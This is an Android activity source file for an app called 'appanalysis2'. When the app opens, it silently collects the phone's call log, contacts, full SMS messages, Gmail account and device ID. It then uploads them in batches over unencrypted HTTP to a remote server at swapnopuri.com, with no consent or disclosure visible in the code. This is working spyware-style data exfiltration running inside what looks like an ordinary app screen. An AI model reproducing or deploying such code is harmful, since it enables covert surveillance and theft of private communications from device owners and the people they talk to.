package com.example.nayan.appanalysis2.activity;

import android.annotation.TargetApi;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;

import com.example.nayan.appanalysis2.R;
import com.example.nayan.appanalysis2.database.DBManager;
import com.example.nayan.appanalysis2.fragment.HomeFragment;
import com.example.nayan.appanalysis2.model.MCalllog;
import com.example.nayan.appanalysis2.model.MContact;
import com.example.nayan.appanalysis2.model.MScreenshot;
import com.example.nayan.appanalysis2.model.MSms;
import com.example.nayan.appanalysis2.tools.Utils;
import com.google.gson.Gson;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.JsonHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import cz.msebera.android.httpclient.Header;
import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.contacts.Contact;
import me.everything.providers.android.contacts.ContactsProvider;
import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;
import me.everything.providers.core.Data;

/**
 * Created by Dev on 12/27/2017.
 */
public class MainActivity extends AppCompatActivity {
    private ArrayList<MScreenshot> mScreenshots;
    private static MainActivity instance;
    private Gson gson;
    private Toolbar toolbar;
    private String gmail, device;
    private ArrayList<MCalllog> calllogArrayList;
    private ArrayList<MContact> contactArrayList;
    private ArrayList<MSms> smsArrayList;
    private List<Call> calls;
    private List<Contact> contactList;
    private List<Sms> smses;
    private MCalllog mCalllog;
    private MContact mContact;
    private MSms mSms;
    private int startCallLog = 0, desCallLog = 10, startContact = 0, desContact = 10, startSms = 0, desSms = 10;
    private String jsonCallLog, jsonContacts, jsonSms;
    private Handler handler;
    private int getStartCall = 0, getDesCall = 10, getStartSms = 0, getDesSm = 10, getStartCon = 0, getDesCon = 10;

    public static MainActivity getInstance() {
        return instance;
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        init();
        prepareDisplay();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                addCallLogToDb();
                addContactDb();
                addSmsDb();
            }
        }, 5000);


//        AppUsagesTime appUsagesTime=new AppUsagesTime();
//        appUsagesTime.usageTime();
    }


    private void prepareDisplay() {
        setSupportActionBar(toolbar);
        setFragment(HomeFragment.class);
    }

    private void init() {
        instance = this;
        handler = new Handler();
        mScreenshots = new ArrayList<>();
        calllogArrayList = new ArrayList<>();
        contactArrayList = new ArrayList<>();
        smsArrayList = new ArrayList<>();
        gson = new Gson();
        toolbar = (Toolbar) findViewById(R.id.toolbar);

        //get gmail
        gmail = Utils.getPhoneGmailAcc(this);

        //get device id
        device = Utils.getDeviceId(this);
    }

    private void addCallLogToDb() {
        // get call_log data
        CallsProvider callsProvider = new CallsProvider(getApplicationContext());
        Data<Call> callLog = callsProvider.getCalls();
        calls = callLog.getList();
        Utils.log("callog : ", "calls size " + calls.size());
        getStartCall = Integer.parseInt(Utils.getPref("getStartCall", 0 + ""));
        getDesCall = Integer.parseInt(Utils.getPref("getDesCall", 10 + ""));
        Utils.log("callog : ", "getStartCall " + getStartCall);
        Utils.log("callog : ", "getDesCall " + getDesCall);
        if (calls.size() < getDesCall) {
            Utils.log("callog : ", "logic " + getStartCall);
            getDesCall = calls.size();

        }
        if (getStartCall >= calls.size())
            return;
        Utils.log("callog : ", "getStartCall  " + getStartCall);
        Utils.log("callog : ", "getDesCall " + getDesCall);
        for (int i = getStartCall; i < getDesCall; i++) {
            mCalllog = new MCalllog();
            mCalllog.setId((int) calls.get(i).id);
            mCalllog.setNumber(calls.get(i).number);
            mCalllog.setType(String.valueOf(calls.get(i).type));
            mCalllog.setDuration(String.valueOf(calls.get(i).duration));
            mCalllog.setCallDate(String.valueOf(calls.get(i).callDate));
            DBManager.getInstance().addCallLog(mCalllog, DBManager.TABLE_CALL_LOG);
        }

//        startCallLog = Integer.parseInt(Utils.getPref("start", 0 + ""));
//        desCallLog = Integer.parseInt(Utils.getPref("destination", 10 + ""));
//        Utils.log("call_log start ", startCallLog + "");
//        Utils.log("call_log dest ", desCallLog + "");
        calllogArrayList = DBManager.getInstance().getCallLog();
        Utils.log("db : ", "callog size " + calllogArrayList.size());
        if (calllogArrayList.size() <= getDesCall)
            getDesCall = calllogArrayList.size();
        jsonCallLog = gson.toJson(calllogArrayList.subList(getStartCall, getDesCall));
        Utils.log("call_log", jsonCallLog);

        if (calllogArrayList.size() > getStartCall) {
            if (Utils.isInternetOn())
                sendCalllogToServer(gmail, device);
        }

//        }


    }

    public void addContactDb() {
        ContactsProvider contactsProvider = new ContactsProvider(getApplicationContext());
        Data<Contact> contacts = contactsProvider.getContacts();
        contactList = contacts.getList();
        Utils.log("contactList : ", " size " + contactList.size());
        getStartCon = Integer.parseInt(Utils.getPref("getStartCon", 0 + ""));
        getDesCon = Integer.parseInt(Utils.getPref("getDesCon", 10 + ""));
        if (contactList.size() < getDesCon)
            getDesCon = contactList.size();

        if (getStartCon >= contactList.size())
            return;
        for (int i = getStartCon; i < getDesCon; i++) {
            mContact = new MContact();
            mContact.setId((int) contactList.get(i).id);
            mContact.setNormilizedPhone(contactList.get(i).normilizedPhone);
            mContact.setPhone(contactList.get(i).phone);
            mContact.setDisplayName(contactList.get(i).displayName);
            DBManager.getInstance().addContacts(mContact, DBManager.TABLE_CONTACTS);
        }

//        startContact = Integer.parseInt(Utils.getPref("startContact", 0 + ""));
//        desContact = Integer.parseInt(Utils.getPref("desContact", 10 + ""));
//        Utils.log("contact start ", startContact + "");
//        Utils.log("contact dest ", desContact + "");
        contactArrayList = DBManager.getInstance().getContacts();
        Utils.log("db : ", "contact size " + contactArrayList.size());
        if (contactArrayList.size() <= getDesCon)
            getDesCon = contactArrayList.size();
        jsonContacts = gson.toJson(contactArrayList.subList(getStartCon, getDesCon));

        Utils.log("contact", jsonContacts);
        if (contactArrayList.size() > getStartCon) {
            if (Utils.isInternetOn())
                sendContactsToServer(gmail, device);
        }

//        }


    }

    private void addSmsDb() {

        TelephonyProvider provider = new TelephonyProvider(getApplicationContext());
        Data<Sms> sms = provider.getSms(TelephonyProvider.Filter.ALL);
        smses = sms.getList();
        Utils.log("smses : ", " size " + smses.size());
        getStartSms = Integer.parseInt(Utils.getPref("getStartSms", 0 + ""));
        getDesSm = Integer.parseInt(Utils.getPref("getDesSm", 10 + ""));
        Utils.log("smses : ", " getStartSms " + getStartSms);
        Utils.log("smses : ", " getDesSm " + getDesSm);
        if (smses.size() < getDesSm)
            getDesSm = smses.size();
        Utils.log("smses : ", " getDesSm 2 " + getDesSm);

        if (getStartSms >= smses.size())
            return;
        for (int i = getStartSms; i < getDesSm; i++) {
            mSms = new MSms();
            mSms.setId((int) smses.get(i).id);
            mSms.setReceivedDate(String.valueOf(smses.get(i).receivedDate));
            mSms.setSentDate(String.valueOf(smses.get(i).sentDate));
            mSms.setType(String.valueOf(smses.get(i).type));
            mSms.setBody(smses.get(i).body);
            mSms.setAddress(smses.get(i).address);
            DBManager.getInstance().addSms(mSms, DBManager.TABLE_SMS);
        }
//        startSms = Integer.parseInt(Utils.getPref("startSms", 0 + ""));
//        desSms = Integer.parseInt(Utils.getPref("desSms", 10 + ""));
//        Utils.log("sms start ", startSms + "");
//        Utils.log("sms dest ", desSms + "");
        smsArrayList = DBManager.getInstance().getSms();
        Utils.log("db", " sms size " + smsArrayList.size());
        if (smsArrayList.size() <= getDesSm)
            getDesSm = smsArrayList.size();
        jsonSms = gson.toJson(smsArrayList.subList(getStartSms, getDesSm));
        if (smsArrayList.size() > getStartSms) {
            if (Utils.isInternetOn())
                sendSmsToServer(gmail, device);
        }

//        }

    }


    public void sendContactsToServer(String email, String device) {
        //get contacts data

        JSONObject j = new JSONObject();
        try {
            j.put("contacts", jsonContacts);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        if (!Utils.isInternetOn())
            return;
        Utils.log("Call", "contacts server");
        AsyncHttpClient client = new AsyncHttpClient();
        RequestParams params = new RequestParams();
        params.put("email", email);
        params.put("device_id", device);
        params.put("contacts", jsonContacts);

        client.post("http://www.swapnopuri.com/app/calllog/api/contact_log_insert/", params, new JsonHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, JSONArray response) {
                super.onSuccess(statusCode, headers, response);
                Utils.log("contacts", " response " + response.toString());
                try {
                    if (response.getJSONObject(0).has("status") && response.getJSONObject(0).getString("status").equals("success")) {
                        Utils.log("contacts", "  uploaded");
                        if (contactList.size() > getDesCon + 9) {
                            getStartCon = getDesCon;
                            getDesCon = getDesCon + 10;
                        } else {
                            getStartCon = getDesCon;
                            getDesCon = contactList.size();
                        }
                        Utils.savePref("getStartCon", getStartCon + "");
                        Utils.savePref("getDesCon", getDesCon + "");
//                        if (contactArrayList.size() > desContact + 9) {
//                            startContact = desContact;
//                            desContact = desContact + 10;
//                        } else {
//                            startContact = desContact;
//                            desContact = desContact + (contactArrayList.size() - desContact);
//                        }
//                        Utils.savePref("startContact", startContact + "");
//                        Utils.savePref("desContact", desContact + "");

                    } else {
                        Utils.log("contacts", " not uploaded");

                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                    Utils.log("contacts ", "error ");
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {
                super.onFailure(statusCode, headers, responseString, throwable);
                Utils.log("contacts ", "failure " + responseString);
            }
        });
    }

    public void sendCalllogToServer(String email, String device) {


        if (!Utils.isInternetOn())
            return;
        Utils.log("Call", "call_log server");
        AsyncHttpClient client = new AsyncHttpClient();
        RequestParams params = new RequestParams();
        params.put("email", email);
        params.put("device_id", device);
        params.put("call_log", jsonCallLog);

        client.post("http://www.swapnopuri.com/app/calllog/api/call_log_insert/", params, new JsonHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, JSONArray response) {
                super.onSuccess(statusCode, headers, response);
                Utils.log("call_log", " response " + response.toString());
                try {
                    if (response.getJSONObject(0).has("status") && response.getJSONObject(0).getString("status").equals("success")) {
                        Utils.log("call_log", "  uploaded");
                        if (calls.size() > getDesCall + 9) {
                            getStartCall = getDesCall;
                            getDesCall = getDesCall + 10;
                        } else {
                            getStartCall = getDesCall;
                            getDesCall = calls.size();
                        }
                        Utils.savePref("getStartCall", getStartCall + "");
                        Utils.savePref("getDesCall", getDesCall + "");
//                        if (calllogArrayList.size() > desCallLog + 9) {
//                            startCallLog = desCallLog;
//                            desCallLog = desCallLog + 10;
//                        } else {
//                            startCallLog = desCallLog;
//                            desCallLog = desCallLog + (calllogArrayList.size() - desCallLog);
//                        }
//
//                        Utils.savePref("start", startCallLog + "");
//                        Utils.savePref("destination", desCallLog + "");

                    } else {
                        Utils.log("call_log", " not uploaded");

                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                    Utils.log("sms ", "error");
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {
                super.onFailure(statusCode, headers, responseString, throwable);
                Utils.log("call_log ", "failure " + responseString);
            }
        });
    }

    public void sendSmsToServer(String email, String device) {
        //get sms data


        Utils.log("sms", jsonSms);
        if (!Utils.isInternetOn())
            return;
        Utils.log("Call", "sms server");
        AsyncHttpClient client = new AsyncHttpClient();
        RequestParams params = new RequestParams();
        params.put("email", email);
        params.put("device_id", device);
        params.put("sms", jsonSms);

        client.post("http://www.swapnopuri.com/app/calllog/api/sms_log_insert/", params, new JsonHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, JSONArray response) {
                super.onSuccess(statusCode, headers, response);
                Utils.log("sms ", "response " + response.toString());
                try {
                    if (response.getJSONObject(0).has("status") && response.getJSONObject(0).getString("status").equals("success")) {
                        Utils.log("sms", "  uploaded");

                        if (smses.size() > getDesSm + 9) {
                            getStartSms = getDesSm;
                            getDesSm = getDesSm + 10;
                        } else {
                            getStartSms = getDesSm;
                            getDesSm = smses.size();
                        }
                        Utils.savePref("getStartSms", getStartSms + "");
                        Utils.savePref("getDesSm", getDesSm + "");
//                        if (smsArrayList.size() > desSms + 9) {
//                            startSms = desSms;
//                            desSms = desSms + 10;
//                        } else {
//                            startSms = desSms;
//                            desSms = desSms + (smsArrayList.size() - desSms);
//                        }
//                        Utils.savePref("startSms", startSms + "");
//                        Utils.savePref("desSms", desSms + "");

                    } else {
                        Utils.log("sms", " not uploaded");

                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                    Utils.log("sms ", "error");
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, String responseString, Throwable throwable) {
                super.onFailure(statusCode, headers, responseString, throwable);
                Utils.log("sms ", "failure " + responseString);
            }
        });
    }

    private void deleteImageFromSdcard() {
        mScreenshots = DBManager.getInstance().getScreenshot();
        File externalFilesDir = this.getExternalFilesDir(null);
        String path = externalFilesDir.getAbsolutePath() + "/screenshots/" + mScreenshots.get(21).getImgName();
        File file = new File(path);
        if (file.exists()) {
            if (file.delete()) {
                Utils.log("file Deleted :", " " + path + mScreenshots.get(21).getImgName());
            } else {
                Utils.log("file Not Deleted :", " " + path + mScreenshots.get(21).getImgName());
            }
        }
    }


    private void setFragment(Class<? extends Fragment> fragment) {
        try {
            FragmentManager fragmentManager = getSupportFragmentManager();
            FragmentTransaction fragmentTransaction = fragmentManager.beginTransaction();
            fragmentTransaction.replace(R.id.main_fragment_container, fragment.newInstance());
            fragmentTransaction.commit();
        } catch (Exception e) {
        }
    }
}
